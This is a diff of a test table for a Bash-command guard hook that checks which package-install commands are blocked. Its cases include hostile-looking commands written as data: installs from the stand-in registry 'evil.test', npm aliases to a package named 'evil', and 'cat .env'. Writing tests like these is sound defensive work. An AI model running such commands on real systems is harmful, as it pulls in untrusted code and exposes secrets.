@@ -121,6 +121,10 @@ for (const [c, code] of [
   ['npm i foo --registry https://evil.test', 2], ['npm i foo --registry=https://evil.test', 2], ['pip install --extra-index-url https://evil.test foo', 2],
   ['pip install -i https://evil.test foo==1.0.0', 2], ['GOPROXY=https://evil.test go get example.com/m@v1.0.0', 2],
   ['bash -c "echo \'a;b\' && npm i foo@npm:evil"', 2], ["echo 'npm i foo@npm:evil'", 0], ['echo "(" && cat .env', 2],
+  ['cargo add serde', 2], ['gem install rails', 2], ['composer require x/y', 2], ['brew install jq', 2], ['deno add npm:chalk', 2],
+  ['uv run --with requests script.py', 2], ['go run ./cmd', 0], ['pipenv install flask', 2],
+  ['npm run build', 0], ['pnpm update', 0], ['yarn install', 0], ['npm ci', 0], ['go test ./...', 0], ['git add .', 0], ['uv run pytest', 0],
+  ['uv tool install ruff', 2], ['npm  exec --yes -- foo@npm:evil', 2],
   ['npm i pkg{a,b}', 2], ['npm i $PKG', 2], ['corepack pnpm add foo@npm:evil', 2], ['pip install "requests==2.31.0; python_version>\'3.8\'"', 0 /* exact pin */ ]])
   expect(`guard-bash ${c}`, 'guard-bash.mjs', tool('Bash', { command: c }), code)
 rmSync(join(repo, 'notes.txt')); rmSync(join(repo, '.env'))
